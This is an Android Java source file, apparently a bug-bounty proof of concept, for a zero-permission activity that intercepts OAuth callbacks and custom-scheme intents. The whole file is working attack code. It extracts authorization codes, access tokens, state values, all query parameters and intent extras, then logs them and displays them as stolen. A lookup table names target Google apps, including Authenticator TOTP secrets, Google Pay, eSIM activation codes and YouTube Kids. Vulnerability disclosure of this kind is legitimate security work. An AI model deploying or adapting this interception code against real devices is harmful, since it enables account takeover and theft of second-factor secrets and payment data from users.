package com.vrp.zeroperm;

import android.app.Activity;
import android.content.Intent;
import android.graphics.Color;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.util.TypedValue;
import android.view.Gravity;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;

public class OAuthInterceptActivity extends Activity {
    private static final String T = "OAUTH_INTERCEPT";

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        Log.w(T, "=== OAuth Scheme Interception PoC ===");
        Log.w(T, "UID=" + android.os.Process.myUid() + " (ZERO permissions)");

        Intent intent = getIntent();
        Uri data = intent != null ? intent.getData() : null;

        ScrollView scroll = new ScrollView(this);
        scroll.setBackgroundColor(Color.BLACK);
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setPadding(48, 48, 48, 48);

        TextView title = new TextView(this);
        title.setText("OAUTH INTERCEPTION PoC");
        title.setTextColor(Color.RED);
        title.setTextSize(TypedValue.COMPLEX_UNIT_SP, 24);
        title.setGravity(Gravity.CENTER);
        root.addView(title);

        addLine(root, "");
        addLine(root, "UID: " + android.os.Process.myUid(), Color.YELLOW);
        addLine(root, "Package: " + getPackageName(), Color.YELLOW);
        addLine(root, "Permissions: ZERO", Color.RED);
        addLine(root, "");

        if (data != null) {
            Log.w(T, "[+] Data URI: " + data);

            addLine(root, "--- INTERCEPTED OAUTH CALLBACK ---", Color.RED);
            addLine(root, "");
            addLine(root, "Full URI:", Color.WHITE);
            addLine(root, data.toString(), Color.GREEN);
            addLine(root, "");
            addLine(root, "Scheme: " + data.getScheme(), Color.CYAN);
            addLine(root, "Host: " + data.getHost(), Color.CYAN);
            addLine(root, "Path: " + data.getPath(), Color.CYAN);
            addLine(root, "");

            String code = data.getQueryParameter("code");
            if (code != null) {
                Log.w(T, "[!!!] INTERCEPTED AUTH CODE: " + code);
                addLine(root, "STOLEN AUTH CODE:", Color.RED);
                addLine(root, code, Color.GREEN);
                addLine(root, "");
                addLine(root, "Impact: attacker exchanges this code", Color.WHITE);
                addLine(root, "for access_token + refresh_token", Color.WHITE);
                addLine(root, "=> FULL ACCOUNT ACCESS", Color.RED);
            }

            String token = data.getQueryParameter("access_token");
            if (token != null) {
                Log.w(T, "[!!!] INTERCEPTED ACCESS TOKEN: " + token);
                addLine(root, "STOLEN ACCESS TOKEN:", Color.RED);
                addLine(root, token, Color.GREEN);
            }

            String state = data.getQueryParameter("state");
            if (state != null) {
                Log.w(T, "[!!!] INTERCEPTED STATE: " + state);
                addLine(root, "CSRF State: " + state, Color.YELLOW);
            }

            addLine(root, "");
            if (data.getQuery() != null) {
                addLine(root, "--- ALL PARAMETERS ---", Color.WHITE);
                for (String param : data.getQueryParameterNames()) {
                    String val = data.getQueryParameter(param);
                    addLine(root, param + " = " + val, Color.GREEN);
                    Log.w(T, "[+] Param: " + param + " = " + val);
                }
            }

            addLine(root, "");
            addLine(root, "The legitimate app NEVER received", Color.RED);
            addLine(root, "this OAuth callback.", Color.RED);
            addLine(root, "");
            addLine(root, "Target app: " + getTargetApp(data.getScheme()), Color.YELLOW);
        } else {
            addLine(root, "No OAuth data intercepted", Color.GRAY);
            addLine(root, "Waiting for OAuth redirect...", Color.GRAY);
        }

        Bundle extras = intent != null ? intent.getExtras() : null;
        if (extras != null && !extras.isEmpty()) {
            addLine(root, "");
            addLine(root, "--- INTENT EXTRAS ---", Color.WHITE);
            for (String key : extras.keySet()) {
                addLine(root, key + " = " + extras.get(key), Color.GREEN);
                Log.w(T, "[+] Extra: " + key + " = " + extras.get(key));
            }
        }

        Log.w(T, "=== Zero-permission app intercepted OAuth callback ===");

        scroll.addView(root);
        setContentView(scroll);
        // Don't finish — keep UI visible to show stolen data
    }

    private String getTargetApp(String scheme) {
        if (scheme == null) return "unknown";
        if (scheme.equals("com.google.android.wear.companion"))
            return "Wear OS Companion (wearable + health data)";
        if (scheme.equals("comgooglecast"))
            return "Google Home (smart home device control)";
        if (scheme.equals("vnd.youtube.kids"))
            return "YouTube Kids (child profile data)";
        if (scheme.equals("pix"))
            return "Google Wallet (Pix payment data)";
        if (scheme.equals("otpauth"))
            return "Google Authenticator (2FA TOTP/HOTP secret)";
        if (scheme.equalsIgnoreCase("fido"))
            return "GMS FIDO2 (security key QR auth session)";
        if (scheme.equals("tez") || scheme.equals("gpay"))
            return "Google Pay (UPI payment data)";
        if (scheme.equalsIgnoreCase("contactkeys"))
            return "Contact Keys (E2E encryption key verification)";
        if (scheme.equals("googlehome"))
            return "Google Home (smart home control)";
        if (scheme.equals("LPA"))
            return "eSIM (LPA activation code — SIM theft)";
        if (scheme.equals("com.android.euicc"))
            return "eSIM (OAuth carrier provisioning code)";
        if (scheme.equals("vnd.youtube.gdi"))
            return "YouTube (account linking OAuth — device integration)";
        return scheme;
    }

    private void addLine(LinearLayout root, String text, int color) {
        TextView tv = new TextView(this);
        tv.setText(text);
        tv.setTextColor(color);
        tv.setTextSize(TypedValue.COMPLEX_UNIT_SP, 14);
        tv.setPadding(0, 4, 0, 4);
        root.addView(tv);
    }

    private void addLine(LinearLayout root, String text) {
        addLine(root, text, Color.WHITE);
    }
}
